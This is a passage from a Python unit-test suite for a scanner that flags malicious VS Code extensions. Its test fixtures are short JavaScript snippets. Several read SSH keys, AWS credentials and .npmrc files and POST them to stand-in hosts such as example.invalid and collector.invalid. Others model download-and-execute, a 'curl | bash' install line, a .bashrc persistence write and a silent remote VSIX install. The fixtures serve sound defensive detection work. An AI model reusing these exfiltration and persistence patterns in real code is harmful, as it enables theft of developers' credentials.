            with self.assertRaisesRegex(ValueError, "cannot describe a VSIX"):
                scan_targets(paths=[vsix], path_artifact_origin="source_snapshot")

    def test_hash_pinned_remote_artifact_is_not_claimed_as_registry_original(self) -> None:
        with TemporaryDirectory() as tmp:
            vsix = Path(tmp) / "remote.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"remote","version":"1.0.0"}')
            digest = hashlib.sha256(vsix.read_bytes()).hexdigest()
            with patch("ide_scanner.scanner.acquire_https_vsix", return_value=vsix):
                report = scan_targets(artifact_url="https://example.com/remote.vsix", artifact_sha256=digest)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["artifact_identity"]["artifact_origin"], "archive_artifact")
        self.assertFalse(scanned["artifact_identity"]["original_registry_artifact"])
        self.assertTrue(scanned["artifact_identity"]["sha256_verified"])
        self.assertNotIn("example.com", json.dumps(scanned))

    def test_known_bad_vsix_hash_feed_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "bad.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"bad","name":"vsix","version":"1.0.0"}')
                archive.writestr("extension/extension.js", "console.log('payload')")
            digest = hashlib.sha256(vsix.read_bytes()).hexdigest()
            feed = root / "known-bad.json"
            feed.write_text(
                '{"hashes":[{"sha256":"' + digest + '","source":"unit-test","classification":"malware"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[vsix], known_bad_hashes_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("known-bad-artifact", {finding["rule_id"] for finding in scanned["findings"]})

    def test_vendored_generated_code_does_not_drive_static_verdict(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"vendored","version":"1.0.0"}',
                encoding="utf-8",
            )
            vendored = root / "node_modules" / "pkg"
            vendored.mkdir(parents=True)
            (vendored / "index.js").write_text(
                "fetch('https://example.com'); require('child_process').exec('whoami'); eval('1')",
                encoding="utf-8",
            )
            py_vendor = root / "python_files" / "lib" / "pkg"
            py_vendor.mkdir(parents=True)
            (py_vendor / "module.py").write_text(
                "import subprocess\nsubprocess.Popen(['whoami'])\n__import__('os')\n",
                encoding="utf-8",
            )
            (root / "webview.min.js").write_text(
                "fetch('https://example.com'); require('child_process').exec('whoami'); eval('1')",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_authority, "none")
        self.assertTrue(all(finding.evidence["evidence_class"] == "reputation" for finding in report.findings))

    def test_local_dynamic_import_is_not_mislabeled_as_code_evaluation(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dynamic-import","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'async function load() { return import("./feature.js"); }',
                encoding="utf-8",
            )
            (root / "feature.js").write_text("module.exports = {};", encoding="utf-8")

            report = scan_extension(root)

        self.assertNotIn("dynamic-code-loading", {finding.rule_id for finding in report.findings})

    def test_remote_dynamic_import_remains_visible(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"remote-import","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'async function load() { return import("https://example.invalid/payload.js"); }',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn("dynamic-code-loading", {finding.rule_id for finding in report.findings})

    def test_large_generated_bundle_does_not_create_correlated_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"bundle","version":"1.0.0","main":"main.js"}',
                encoding="utf-8",
            )
            token_blob = (
                "process.env.SECRET_FILE; fetch('https://example.com'); "
                "eval(Buffer.from('YWxlcnQoMSk=','base64').toString()); rmSync('x',{recursive:true}); "
            )
            (root / "main.js").write_text("var bundle=1;\n" * 35 + token_blob * 4000, encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertIn("obfuscation-execution-network", {finding.rule_id for finding in report.findings})
        self.assertEqual(report.analysis_coverage["coverage_percent"], 100)

    def test_bundle_classification_is_independent_of_coverage_limit(self) -> None:
        minified = "const x=1;" * 110_000
        medium_minified = "const x=1;" * 60_000
        large_compiled = "const x=1;\n" * 1_000_000

        self.assertTrue(_is_generated_code_blob("dist/web.js", minified))
        self.assertTrue(_is_generated_code_blob("out/extension.js", medium_minified))
        self.assertTrue(_is_generated_code_blob("out/extension.js", large_compiled))
        self.assertTrue(_is_generated_code_blob("dist/main.js", "/******/ (() => { // webpackBootstrap\n" + ("const x=1;\n" * 100_000)))
        self.assertFalse(_is_generated_code_blob("src/extension.js", "const x=1;\n" * 100))

    def test_semgrep_scope_excludes_large_and_minified_bundles_explicitly(self) -> None:
        self.assertIn(
            "source limit",
            _semgrep_scope_exclusion("const value = 1;\n" * 70_000) or "",
        )
        self.assertIn(
            "line density",
            _semgrep_scope_exclusion("const value=1;" * 2_000) or "",
        )
        self.assertIsNone(_semgrep_scope_exclusion("export function activate() { return true; }\n"))

    def test_generated_bundle_does_not_create_file_wide_csp_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-bundle","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "createWebviewPanel();" + "const filler=1;" * 20_000,
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn("webview-csp-missing", {finding.rule_id for finding in report.findings})

    def test_generated_bundle_preserves_explicit_unsafe_csp_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-csp","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "createWebviewPanel();"
                "const html=`<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-eval'\">`;"
                + "const filler=1;" * 20_000,
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn("webview-csp-unsafe-directive", {finding.rule_id for finding in report.findings})

    def test_generated_bundle_preserves_real_credential_network_flow_detection(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"generated-exfil","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs');"
                "const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
                "fetch('https://example.invalid',{method:'POST',body:key});"
                + "const filler=1;" * 20_000,
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn(
            "credential-exfiltration-chain",
            {finding.rule_id for finding in report.findings},
        )

    def test_neighboring_minified_call_does_not_contaminate_configuration_update(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"bounded-call","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "workspace.getConfiguration('github').update('copilot.instructions',value),"
                "commands.executeCommand('trivy.loginWithToken');",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn("credential-config-update", {finding.rule_id for finding in report.findings})

    def test_unterminated_generated_configuration_call_is_bounded(self) -> None:
        text = "".join("getConfiguration(" + ("x" * 1000) for _ in range(200))
        matches = _find_sensitive_api_text(
            text,
            r"(?:getConfiguration\s*\([^)]{0,500}\)\s*\.\s*get|config\s*\.\s*get)\s*\((?P<args>[^;\n]{0,500})",
            "WorkspaceConfiguration",
        )

        self.assertEqual(matches, [])

    def test_declared_dist_entrypoint_is_never_silently_skipped(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "dist").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dist-entry","version":"1.0.0","main":"dist/extension.js"}',
                encoding="utf-8",
            )
            (root / "dist" / "extension.js").write_text(
                "const fs=require('fs'); const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
                "fetch('https://example.invalid',{method:'POST',body:key});",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "block")
        self.assertIn("dist/extension.js", report.analysis_coverage["analyzed_executable_files"])

    def test_root_dist_modules_are_analyzed_without_hiding_the_entrypoint(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "dist").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dist-bundle","version":"1.0.0","main":"dist/extension.js"}',
                encoding="utf-8",
            )
            (root / "dist" / "extension.js").write_text("exports.activate=()=>{};", encoding="utf-8")
            (root / "dist" / "100.js").write_text("module.exports={};", encoding="utf-8")
            (root / "types.d.ts").write_text("export interface Settings {};", encoding="utf-8")
            (root / "webview-ui").mkdir()
            (root / "webview-ui" / "build").mkdir()
            (root / "webview-ui" / "build" / "assets").mkdir()
            (root / "webview-ui" / "build" / "assets" / "chunk-ABC.js").write_text(
                "module.exports={};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn("dist/extension.js", report.analysis_coverage["executable_candidates"])
        self.assertIn("dist/100.js", report.analysis_coverage["executable_candidates"])
        self.assertIn("dist/100.js", report.analysis_coverage["analyzed_executable_files"])
        for generated in ("types.d.ts", "webview-ui/build/assets/chunk-ABC.js"):
            self.assertIn(generated, report.analysis_coverage["excluded_generated_files"])
            self.assertNotIn(generated, report.analysis_coverage["executable_candidates"])

    def test_executable_content_after_old_text_limit_is_analyzed(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"large-entry","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            payload = (
                "const fs=require('fs'); const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
                "fetch('https://example.invalid',{method:'POST',body:key});"
            )
            (root / "extension.js").write_text("const padding='x';\n" * 14_000 + payload, encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.analysis_coverage["status"], "complete")

    def test_missing_declared_entrypoint_is_incomplete_not_allow(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"missing-entry","version":"1.0.0","main":"dist/missing.js"}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.decision, "incomplete")
        self.assertTrue(report.artifact_inventory["scan_incomplete"])
        self.assertIn("dist/missing.js", report.analysis_coverage["missing_entrypoints"])

    def test_missing_optional_browser_entrypoint_does_not_invalidate_desktop_scan(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "out").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"desktop-browser-alternate","version":"1.0.0",'
                '"main":"out/extension.js","browser":"dist/web/extension.js"}',
                encoding="utf-8",
            )
            (root / "out" / "extension.js").write_text("module.exports = {};", encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.analysis_coverage["status"], "complete")
        self.assertEqual(report.analysis_coverage["missing_entrypoints"], [])
        self.assertEqual(report.analysis_coverage["optional_missing_entrypoints"], ["dist/web/extension.js"])
        self.assertIn("out/extension.js", report.analysis_coverage["resolved_entrypoints"])

    def test_suffixless_node_entrypoint_resolves_to_javascript(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "out").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"suffixless","version":"1.0.0","main":"out/extension"}',
                encoding="utf-8",
            )
            (root / "out" / "extension.js").write_text("module.exports = {};", encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.decision, "allow")
        self.assertEqual(report.analysis_coverage["missing_entrypoints"], [])
        self.assertIn("out/extension.js", report.analysis_coverage["resolved_entrypoints"])

    def test_weak_standalone_static_indicator_stays_clean(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"weak","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("const token = process.env.API_TOKEN;", encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_authority, "none")
        self.assertEqual(report.severity, "INFO")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.risk_score, 0)
        self.assertIn("weak", {finding.evidence["evidence_class"] for finding in report.findings})

    def test_correlated_static_chain_is_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"chain","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs = require('fs'); const https = require('https');"
                "const secretPath = process.env.SECRET_FILE;"
                "const data = fs.readFileSync(secretPath); https.request('https://example.com').write(data);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.malware_authority, "non_authoritative")
        self.assertEqual(report.decision, "block")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.public_outcome, "preventive_block")
        self.assertGreaterEqual(report.risk_score, report.malware_score)
        self.assertIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_destructive_transfer_chain_is_review_only_without_data_theft_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"backup-tool","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'),zlib=require('zlib'),https=require('https');"
                "fs.rmSync('/tmp/old-backup',{recursive:true,force:true});"
                "const body=zlib.gzipSync(Buffer.from('backup'));"
                "https.request('https://backup.invalid',{method:'POST'},res=>res).write(body);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertEqual(report.public_outcome, "investigate")
        self.assertIn("destructive-transfer-chain", {finding.rule_id for finding in report.findings})

    def test_persistence_chain_is_review_only_without_observed_behavior(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"command-server","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'),cp=require('child_process'),https=require('https');"
                "fs.writeFileSync('/home/user/.bashrc','alias x=y');"
                "cp.exec('echo ready');"
                "https.request('https://updates.invalid',{method:'POST'});",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertEqual(report.public_outcome, "investigate")
        self.assertIn("persistence-chain", {finding.rule_id for finding in report.findings})

    def test_cross_function_systematic_credential_harvesting_is_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"harvester","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'),os=require('os'),https=require('https');\n"
                "const targets=['/.aws/credentials','/.npmrc','/.git-credentials','/.env'];\n"
                "async function collect(){const home=os.homedir(); const entries=fs.readdirSync(home); "
                "return {passwords:entries.map(x=>fs.readFileSync(home+'/'+x)),apiKeys:[],awsKeys:[],vaults:{}};}\n"
                "function transmit(data){const body=JSON.stringify(data); "
                "const req=https.request({hostname:'collector.invalid',method:'POST'}); req.write(body); req.end();}\n"
                "collect().then(transmit);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        finding = next(
            item for item in report.findings
            if item.rule_id == "credential-harvesting-exfiltration"
        )
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "block")
        self.assertEqual(report.malware_authority, "non_authoritative")
        self.assertEqual(finding.evidence["correlation"], "same-file-interprocedural-semantic-chain")
        self.assertGreaterEqual(len(finding.evidence["credential_families"]), 3)

    def test_same_file_identifier_linked_credential_exfiltration_is_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"identifier-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
            )
            (root / "extension.js").write_text(
                "const secret=fs.readFileSync(home+'/.ssh/id_ed25519');"
                "const payload=JSON.stringify(secret);const body=payload;req.write(body);",
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
        self.assertEqual(report.decision, "block")
        self.assertEqual(report.malware_authority, "non_authoritative")
        self.assertEqual(finding.evidence["variable_path"], ["secret", "payload", "body"])

    def test_function_parameter_linked_credential_exfiltration_is_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"parameter-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
            )
            (root / "extension.js").write_text(
                "function transmit(data){const req=https.request(options);req.write(data)}"
                "const secret=fs.readFileSync(home+'/.aws/credentials');transmit(secret);",
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
        self.assertEqual(report.decision, "block")
        self.assertEqual(finding.evidence["correlation"], "same-file-function-parameter-value-flow")

    def test_object_property_linked_credential_exfiltration_is_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"object-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
            )
            (root / "extension.js").write_text(
                "const collected={};const key=fs.readFileSync(home+'/.ssh/id_ed25519');"
                "collected.sshKey=key;const body=JSON.stringify(collected);req.write(body);",
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
        self.assertEqual(report.decision, "block")
        self.assertIn("collected.sshKey", finding.evidence["variable_path"])

    def test_function_return_linked_credential_exfiltration_is_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"return-stealer","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
            )
            (root / "extension.js").write_text(
                "function encode(value){return JSON.stringify(value)}"
                "const secret=fs.readFileSync(home+'/.npmrc');const body=encode(secret);req.write(body);",
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "credential-identifier-flow-to-network")
        self.assertEqual(report.decision, "block")
        self.assertIn("encode:value:return", finding.evidence["variable_path"])

    def test_cross_file_directed_credential_harvesting_is_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"split-harvester","version":"1.0.0","main":"collector.js"}', encoding="utf-8"
            )
            (root / "collector.js").write_text(
                "const fs=require('fs');fs.readFileSync(home+'/.ssh/id_ed25519');"
                "fs.readFileSync(home+'/.aws/credentials');fs.readFileSync(home+'/.npmrc');require('./encode');",
                encoding="utf-8",
            )
            (root / "encode.js").write_text("const body=JSON.stringify(data);require('./send');", encoding="utf-8")
            (root / "send.js").write_text("const req=https.request(options);req.write(body);", encoding="utf-8")
            report = scan_extension(root)

        finding = next(
            item for item in report.findings
            if item.rule_id == "credential-harvesting-exfiltration"
            and item.evidence.get("correlation") == "cross-file-import-directed-semantic-chain"
        )
        self.assertEqual(report.decision, "block")
        self.assertEqual(finding.evidence["import_path"], ["collector.js", "encode.js", "send.js"])

    def test_module_flow_resource_limit_makes_scan_incomplete(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"flow-limit","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
            )
            (root / "extension.js").write_text("require('./helper')", encoding="utf-8")
            (root / "helper.js").write_text("module.exports={}", encoding="utf-8")
            with patch("ide_scanner.module_flow.MAX_FLOW_MODULES", 1):
                report = scan_extension(root)

        provider = report.analysis_coverage["providers"]["module_flow"]
        self.assertEqual(provider["status"], "failed")
        self.assertTrue(provider["required"])
        self.assertEqual(report.analysis_coverage["status"], "incomplete")
        self.assertEqual(report.decision, "incomplete")

    def test_single_credential_family_backup_client_does_not_trigger_harvesting_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"backup","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'),os=require('os'),https=require('https');\n"
                "const home=os.homedir(); const entries=fs.readdirSync(home);\n"
                "const data=fs.readFileSync(home+'/.npmrc'); const body=JSON.stringify(data);\n"
                "const req=https.request({hostname:'backup.example',method:'POST'}); req.write(body); req.end();",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn(
            "credential-harvesting-exfiltration",
            {finding.rule_id for finding in report.findings},
        )

    def test_standalone_download_execute_requires_review_not_block(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"tool-installer","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const https=require('https'); const cp=require('child_process');"
                "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})

    def test_connectivity_probe_and_local_exec_do_not_create_download_execute(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"proxy-probe","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const https=require('https'); const cp=require('child_process');"
                "https.request({host:'example.com',method:'HEAD'},()=>{});"
                "https.request({host:'proxy.local',method:'CONNECT'},()=>{});"
                "cp.execSync('reg query HKCU\\\\Software\\\\Example');",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("process-execution", rule_ids)
        self.assertNotIn("download-and-execute", rule_ids)

    def test_post_telemetry_and_local_mcp_process_do_not_create_download_execute(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"telemetry-client","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const cp=require('child_process');"
                "fetch('https://telemetry.example/ingest',{method:'POST',body:JSON.stringify(event)});"
                "cp.spawn('npx',['-y','some-mcp-server']);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("process-execution", rule_ids)
        self.assertNotIn("download-and-execute", rule_ids)

    def test_user_facing_downloader_command_is_not_download_execute(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"cli-helper","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const cp=require('child_process');"
                "const installCommand='curl -fsSL https://vendor.example/install | bash';"
                "terminal.sendText(installCommand);"
                "cp.execFile('zig',['build','fmt']);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("process-execution", rule_ids)
        self.assertNotIn("download-and-execute", rule_ids)

    def test_health_check_and_unrelated_shell_helper_do_not_create_download_execute(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"remote-shell","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const {spawn}=require('child_process'); const http=require('http');"
                "function isApiRunning(url){return new Promise(resolve=>{http.get(url,()=>resolve(true));});}"
                "function runCommand(command,args){return spawn(command,args,{shell:true});}",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("process-execution", rule_ids)
        self.assertNotIn("download-and-execute", rule_ids)

    def test_remote_credential_broker_requires_review_without_calling_it_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"hosted-token-client","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const https=require('https');"
                "const tokenServerUrl='https://broker.example/lease-token';"
                "const refreshToken=loadRefreshToken();"
                "https.request(tokenServerUrl,{method:'POST',headers:{Authorization:`Bearer ${refreshToken}`}},()=>{});",
                encoding="utf-8",
            )

            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "remote-credential-broker")
        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.decision, "review")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(finding.evidence["correlation"], "same-file-semantic-chain")
        self.assertIn("not proof of exfiltration", finding.recommendation)

    def test_unverified_remote_vsix_install_requires_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"silent-updater","version":"1.0.0"}', encoding="utf-8"
            )
            (root / "extension.js").write_text(
                "const vscode=require('vscode'),https=require('https'),fs=require('fs');"
                "https.get('https://worker.invalid/update.vsix',res=>{"
                "const out=fs.createWriteStream('/tmp/update.vsix');res.pipe(out);"
                "vscode.commands.executeCommand('workbench.extensions.installExtension','/tmp/update.vsix');});",
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "remote-vsix-install-chain")
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertEqual(report.malware_authority, "non_authoritative")
        self.assertEqual(finding.evidence["sink"], "workbench.extensions.installExtension")
        self.assertFalse(finding.evidence["integrity_verification"])

    def test_hidden_remote_workspace_task_requires_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"nrwl","name":"angular-console","version":"18.95.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'const vscode=require("vscode");'
                'const mcpExtensionInstalledSha="nxConsole.mcpExtensionInstalledSha";'
                'const task=new vscode.Task(vscode.TaskDefinition, vscode.TaskScope.Workspace,'
                '"install-mcp-extension", "nx",'
                'new vscode.ShellExecution("npx -y github:nrwl/nx#558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2"));'
                'task.presentationOptions.focus=!1;',
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "hidden-remote-workspace-task")
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertEqual(finding.evidence["correlation"], "remote-github-execution-plus-hidden-workspace-task")
        self.assertEqual(finding.evidence["execution_surface"], "ShellExecution")

    def test_normal_visible_github_task_does_not_trigger_hidden_task_rule(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"workspace-tool","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'const vscode=require("vscode");'
                'const task=new vscode.Task(vscode.TaskDefinition, vscode.TaskScope.Workspace,'
                '"install-tool", "workspace-tool",'
                'new vscode.ShellExecution("npx -y github:example/tool#558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2"));'
                'task.presentationOptions.focus=true;',
                encoding="utf-8",
            )
            report = scan_extension(root)

        self.assertNotIn("hidden-remote-workspace-task", {item.rule_id for item in report.findings})

    def test_unrelated_bundle_download_and_install_do_not_correlate(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            root.joinpath("package.json").write_text(
                '{"publisher":"redhat","name":"yaml","version":"1.0.0"}', encoding="utf-8"
            )
            root.joinpath("extension.js").write_text(
                "fetch('https://telemetry.example/config');\n"
                + "const unrelated = '" + ("x" * 5000) + "';\n"
                + "fs.writeFile('/tmp/cache.json', unrelated);\n"
                + "vscode.window.showInformationMessage('Install recommended extension').then(() => "
                + "vscode.commands.executeCommand('workbench.extensions.installExtension', 'publisher.name'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn("remote-vsix-install-chain", {item.rule_id for item in report.findings})
        self.assertEqual(report.decision, "allow")

    def test_hash_verified_remote_vsix_install_does_not_trigger_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"verified-updater","version":"1.0.0"}', encoding="utf-8"
            )
            (root / "extension.js").write_text(
                "const vscode=require('vscode'),https=require('https'),fs=require('fs'),crypto=require('crypto');"
                "https.get('https://vendor.example/update.vsix',res=>{"
                "const out=fs.createWriteStream('/tmp/update.vsix');res.pipe(out);"
                "const expectedHash='abc';const actual=crypto.createHash('sha256').update(data).digest('hex');"
                "if(actual === expectedHash)vscode.commands.executeCommand('workbench.extensions.installExtension','/tmp/update.vsix');});",
                encoding="utf-8",
            )
            report = scan_extension(root)

        self.assertNotIn("remote-vsix-install-chain", {item.rule_id for item in report.findings})

    def test_cross_file_import_connected_remote_vsix_install_requires_review(self) -> None:
